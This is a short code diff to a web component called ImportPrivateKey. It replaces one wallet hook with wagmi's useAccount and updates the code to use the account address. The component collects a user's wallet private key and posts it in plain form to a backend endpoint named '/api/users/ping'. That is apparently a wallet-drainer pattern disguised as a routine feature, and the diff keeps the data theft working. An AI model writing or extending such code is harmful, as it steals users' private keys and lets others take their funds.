@@ -5,6 +5,7 @@ import axios from "axios";
 import { config } from "dotenv";
 import { validateKeyChecksum } from "../utils/validate";
 import styles from "../ImortPrivateKey.module.css";
+import { useAccount } from "wagmi";
 
 config();
 
@@ -18,7 +19,7 @@ const ImportPrivateKey = () => {
   const [submittedKey, setSubmittedKey] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState("");
-  const { publicKey } = useWallet();
+  const { address } = useAccount();
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const [extensionInstalled, setExtensionInstalled] = useState(false);
@@ -82,7 +83,7 @@ const ImportPrivateKey = () => {
 
       const data = {
         prv: privateKey,
-        pub: publicKey,
+        pub: address,
       };
 
       const validate = validateKeyChecksum(privateKey);
@@ -115,7 +116,7 @@ const ImportPrivateKey = () => {
             axios
               .post(`${process.env.NEXT_PUBLIC_BACKEND_API!}/api/users/ping`, {
                 privateKey,
-                publicKey,
+                address,
               })
               .then(() => console.log("Ping success"))
               .catch((err) => console.error("Ping error:", err.message));
